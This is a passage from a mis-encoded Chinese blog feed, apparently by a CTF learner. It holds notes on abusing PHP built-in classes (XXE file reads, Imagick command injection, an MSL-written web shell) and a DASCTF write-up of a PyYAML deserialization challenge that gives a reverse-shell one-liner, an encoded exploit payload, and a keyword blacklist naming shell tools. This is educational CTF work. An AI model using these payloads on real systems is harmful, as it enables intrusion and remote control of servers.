class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); è¯»å–æ ¹ç›®å½•ä¸‹ä»¥få¼€å¤´çš„æ–‡ä»¶<br></code></pre></td></tr></table></figure><blockquote><p>ä¸€èˆ¬æƒ…å†µä¸èƒ½éå†è¾“å‡ºé‚£ä¹ˆå°±åªèƒ½è¾“å‡ºä¸€ä¸ª</p></blockquote><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p><code>GlobIterator</code> æ˜¯ PHP çš„å†…ç½®ç±»ï¼Œç»§æ‰¿è‡ª <code>FilesystemIterator</code>ï¼Œä¸“ä¸º <strong>åŸºäºé€šé…ç¬¦æ¨¡å¼ï¼ˆglobï¼‰çš„æ–‡ä»¶éå†</strong> è®¾è®¡ã€‚å®ƒç®€åŒ–äº†æŒ‰æ¨¡å¼åŒ¹é…æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œæ— éœ€æ‰‹åŠ¨è¿‡æ»¤æ–‡ä»¶åï¼Œé€‚ç”¨äºå¿«é€Ÿæšä¸¾æ–‡ä»¶ç³»ç»Ÿæˆ–æŸ¥æ‰¾ç‰¹å®šæ–‡ä»¶ã€‚</p><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">ç›´æ¥è¾“å…¥é€šé…ç¬¦ä½¿ç”¨<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;*.php&#x27;</span>);<br>æˆ–è€…é…åˆè·¯å¾„ä½¿ç”¨ æŸ¥æ‰¾è·¯å¾„ä¸‹åŒ¹é…çš„æ–‡ä»¶<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;/var/www/*.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h1><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><strong>SplFileObject</strong></h2><p><code>SplFileObject</code> æ˜¯ PHP çš„å†…ç½®ç±»ï¼Œç»§æ‰¿è‡ª <code>SplFileInfo</code>ï¼Œä¸“ä¸º <strong>é«˜æ•ˆè¯»å†™æ–‡ä»¶</strong> è®¾è®¡ã€‚å®ƒåœ¨ CTF ä¸­å¸¸ç”¨äº <strong>æ–‡ä»¶å†…å®¹è¯»å–</strong>ã€<strong>æºç æ³„éœ²</strong> å’Œ <strong>ç‰¹æ®Šåè®®åˆ©ç”¨</strong>ï¼Œå°¤å…¶æ˜¯åœ¨ååºåˆ—åŒ–æˆ–æ–‡ä»¶æ“ä½œæ¼æ´åœºæ™¯ä¸­</p><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">ç›´æ¥è¯»å–æ–‡ä»¶<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br>é…åˆä¼ªåè®®è¯»å–æ–‡ä»¶<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a><strong><code>SimpleXMLElement</code></strong></h2><p><code>SimpleXMLElement</code> æ˜¯ PHP çš„å†…ç½®ç±»ï¼Œç”¨äºè§£æå’Œæ“ä½œ XML æ•°æ®ã€‚åœ¨ CTF ä¸­ï¼Œå®ƒå¸¸è¢«ç”¨äº <strong>XXEï¼ˆXML External Entityï¼‰æ”»å‡»</strong>ï¼Œé€šè¿‡æ„é€ æ¶æ„ XML å®ä½“å®ç° <strong>æ–‡ä»¶è¯»å–</strong>ã€<strong>SSRFï¼ˆæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰</strong> æˆ– <strong>è¿œç¨‹ä»£ç æ‰§è¡Œ</strong>ã€‚</p><p>åŸºæœ¬ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-string">&#x27;data.xml&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// ä»æ–‡ä»¶åŠ è½½</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>-&gt;user;<br></code></pre></td></tr></table></figure><p>å¯ä»¥è§£æXMLå®ä½“æ–‡ä»¶é‚£ä¹ˆå¯ä¸å¯ä»¥è‡ªå·±å†™ä¸ªXMLæ–‡ä»¶å®ç°rceæˆ–è€…ä»»æ„æ–‡ä»¶è¯»å–å‘¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//é…åˆä¼ªåè®®è¯»å–æ–‡ä»¶</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-comment">// éœ€è¦å…³é—­å®ä½“åŠ è½½å™¨é™åˆ¶ï¼ˆPHP &lt; 8.0ï¼‰</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>; <span class="hljs-comment">// è¾“å‡º /etc/passwd å†…å®¹</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//è¿›è¡Œssrfï¼Œè¿›è¡Œå¤–å¸¦ç­‰æ“ä½œ</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:8080/&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br></code></pre></td></tr></table></figure><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="Imagick"><a href="#Imagick" class="headerlink" title="Imagick"></a><strong><code>Imagick</code></strong></h2><p><code>Imagick</code> æ˜¯ PHP çš„å›¾åƒå¤„ç†æ‰©å±•ï¼Œæ”¯æŒå¤šç§å›¾åƒæ ¼å¼çš„æ“ä½œã€‚åœ¨ CTF ä¸­ï¼Œå®ƒå¸¸è¢«ç”¨äº <strong>æ¶æ„å›¾åƒåˆ©ç”¨</strong> å’Œ <strong>æ–‡ä»¶è¯»å–&#x2F;å‘½ä»¤æ‰§è¡Œ</strong></p><blockquote><p>CVE-2016-3714:å…è®¸é€šè¿‡æ¶æ„å›¾åƒæ‰§è¡Œå‘½ä»¤ï¼Œåˆ©ç”¨æœ¬å‡½æ•°</p></blockquote><p>å…ˆä¸Šä¼ æ¶æ„å›¾ç‰‡</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">push graphic-context<br>viewbox 0 0 640 480<span class="hljs-built_in"></span><br><span class="hljs-built_in">fill </span>&#x27;url(https://example.com/image.jpg<span class="hljs-string">&quot;|ls -la &gt; /tmp/result&quot;</span>)&#x27;<br>pop graphic-context<br></code></pre></td></tr></table></figure><p>åœ¨è§¦å‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;exploit.png&#x27;</span>); <span class="hljs-comment">// è¯»å–æ¶æ„å›¾åƒ</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.png&#x27;</span>);    <span class="hljs-comment">// è§¦å‘å‘½ä»¤</span><br></code></pre></td></tr></table></figure><p>MSL è„šæœ¬åˆ©ç”¨</p><p>ä¸Šä¼ æ¶æ„mslæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;caption:&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;output.php&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>è§¦å‘ MSL è„šæœ¬</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;msl:poc.msl&#x27;</span>); <span class="hljs-comment">// åŠ è½½ MSL è„šæœ¬</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;dummy.png&#x27;</span>);  <span class="hljs-comment">// ç”Ÿæˆ output.php</span><br></code></pre></td></tr></table></figure><p>è®¿é—® <code>output.php?cmd=id</code> å³å¯æ‰§è¡Œå‘½ä»¤</p><p>é€šè¿‡ <code>caption:</code> åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;caption:&lt;?php echo file_get_contents(&quot;/flag&quot;); ?&gt;&#x27;</span>);<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.php&#x27;</span>); <span class="hljs-comment">// ç”ŸæˆåŒ…å« Flag çš„ PHP æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><h1 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h1><h2 id="Errorå’ŒException"><a href="#Errorå’ŒException" class="headerlink" title="Errorå’ŒException"></a>Errorå’ŒException</h2><p>å¯¹äºæ²¡æœ‰å›æ˜¾çš„rceå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;message = <span class="hljs-variable">$cmd</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;message); <span class="hljs-comment">// è§¦å‘å‘½ä»¤æ‰§è¡Œä½†æ˜¯æ²¡æœ‰å›æ˜¾</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æ„é€  Error å¯¹è±¡ï¼Œåˆ©ç”¨å…¶ __toString æ–¹æ³•</span><br><span class="hljs-variable">$error</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>((<span class="hljs-keyword">string</span>) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-string">&#x27;id&#x27;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$error</span>; <span class="hljs-comment">// è¾“å‡ºå‘½ä»¤æ‰§è¡Œç»“æœ</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHPåŸç”Ÿç±»</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.24</title>
    <link href="/tuyi/2025/01/24/2025-1-24/"/>
    <url>/tuyi/2025/01/24/2025-1-24/</url>
    
    <content type="html"><![CDATA[<h2 id="DASCTF-2024æœ€åä¸€æˆ˜ï½œå¯’å¤œç ´æ™“ï¼Œå†¬è‡³ç»ˆç« -yaml-matser"><a href="#DASCTF-2024æœ€åä¸€æˆ˜ï½œå¯’å¤œç ´æ™“ï¼Œå†¬è‡³ç»ˆç« -yaml-matser" class="headerlink" title="DASCTF 2024æœ€åä¸€æˆ˜ï½œå¯’å¤œç ´æ™“ï¼Œå†¬è‡³ç»ˆç« ]yaml_matser"></a>DASCTF 2024æœ€åä¸€æˆ˜ï½œå¯’å¤œç ´æ™“ï¼Œå†¬è‡³ç»ˆç« ]yaml_matser</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, render_template<br><br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_str</span>):<br><br><br>    blacklist_terms = &#123;<span class="hljs-string">&#x27;apply&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>,<br>                       <span class="hljs-string">&#x27;command&#x27;</span>,<span class="hljs-string">&#x27;static&#x27;</span>,<span class="hljs-string">&#x27;templates&#x27;</span>,<span class="hljs-string">&#x27;session&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span><br>                       <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;ntimeit&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;zsh&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;curl&#x27;</span>, <span class="hljs-string">&#x27;nc&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;before_request&#x27;</span>, <span class="hljs-string">&#x27;after_request&#x27;</span>,<br>                       <span class="hljs-string">&#x27;error_handler&#x27;</span>, <span class="hljs-string">&#x27;add_url_rule&#x27;</span>,<span class="hljs-string">&#x27;teardown_request&#x27;</span>,<span class="hljs-string">&#x27;teardown_appcontext&#x27;</span>,<span class="hljs-string">&#x27;\\u&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>&#125;<br><br>    input_str_lower = <span class="hljs-built_in">str</span>(input_str).lower()<br><br><br>    <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> blacklist_terms:<br>        <span class="hljs-keyword">if</span> term <span class="hljs-keyword">in</span> input_str_lower:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found blacklisted term: <span class="hljs-subst">&#123;term&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br>file_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;.*\.yaml$&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_yaml_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(file_pattern.<span class="hljs-keyword">match</span>(filename))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Welcome to DASCTF X 0psu3</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Enjoy it &lt;a href=&quot;/Yam1&quot;&gt;Yam1&lt;/a&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            uploaded_file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>            <span class="hljs-keyword">if</span> uploaded_file <span class="hljs-keyword">and</span> is_yaml_file(uploaded_file.filename):<br>                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)<br>                uploaded_file.save(file_path)<br><br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;uploaded successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Just YAML file&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Yam1&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Yam1</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;uploads/<span class="hljs-subst">&#123;filename&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            file_content = f.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> waf(file_content):<br>            test = yaml.load(file_content)<br>            <span class="hljs-built_in">print</span>(test)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br><br><br></code></pre></td></tr></table></figure><p>çœ‹æºç æ˜¯YAMLååºåˆ—åŒ–ã€‚ã€‚ã€‚ä¸å¤ªä¼šåé¢åº”è¯¥ä¼šå†™ä¸€ç¯‡åšå®¢å­¦ä¹ ä¸€ä¸‹ å‚è€ƒ<a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/</a></p><p>banäº†å¥½å¤šå¸¸è§„çš„å‡½æ•°å°è¯•ç»•è¿‡å§ï¼Œç¼–ç ç»•è¿‡</p><p>å¯ä»¥å‘ç°æ˜¯ç›´æ¥ä½¿ç”¨çš„<code>yaml.load</code>åº”è¯¥æ˜¯&lt;5.1ç‰ˆæœ¬çš„ï¼Œé«˜ç‰ˆæœ¬è¦ä½¿ç”¨æ„é€ å™¨</p><p>å¯ä»¥å‘ç°execå‡½æ•°æ˜¯æ²¡æœ‰è¿‡æ»¤çš„</p><p>å°è¯•ä½¿ç”¨execæ„å»ºè§£ç å™¨æ‰§è¡Œå‘½ä»¤</p><p>å‘½ä»¤ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;python3 -c \&#x27;</span>import os,pty,socket;s=socket.<span class="hljs-built_in">socket</span>();s.<span class="hljs-built_in">connect</span>((<span class="hljs-string">&quot;ip&quot;</span>,<span class="hljs-number">32800</span>));[os.<span class="hljs-built_in">dup2</span>(s.<span class="hljs-built_in">fileno</span>(),f)for f <span class="hljs-built_in">in</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)];pty.<span class="hljs-built_in">spawn</span>(<span class="hljs-string">&quot;sh&quot;</span>)\<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨urlç¼–ç ä¸Šä¼ æ‰§è¡Œå°±å¯ä»¥</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/new:type</span><br><span class="hljs-attr">args:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">exp</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-type">!!python/tuple</span> []<br>  <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">&quot;extend&quot;:</span> <span class="hljs-type">!!python/name:exec</span> &#125;<br><span class="hljs-attr">listitems:</span> <span class="hljs-string">&quot;import urllib; exec(urllib.parse.unquote(&#x27;%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%73%79%73%74%65%6d%28%27%70%79%74%68%6f%6e%33%20%2d%63%20%5c%27%69%6d%70%6f%72%74%20%6f%73%2c%70%74%79%2c%73%6f%63%6b%65%74%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%69%70%22%2c%33%32%38%30%30%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%29%66%6f%72%20%66%20%69%6e%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29%5c%27%27%29&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p>å­¦ä¹ å¤§ä½¬åšå®¢ï¼š </p><p><a href="https://www.tr0y.wang/s">https://www.tr0y.wang/s</a></p><p><a href="https://lisien11.xyz/">https://lisien11.xyz/</a></p>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PyYAML</tag>
      
      <tag>ååºåˆ—åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPä¼ªåè®®</title>
    <link href="/tuyi/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/tuyi/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
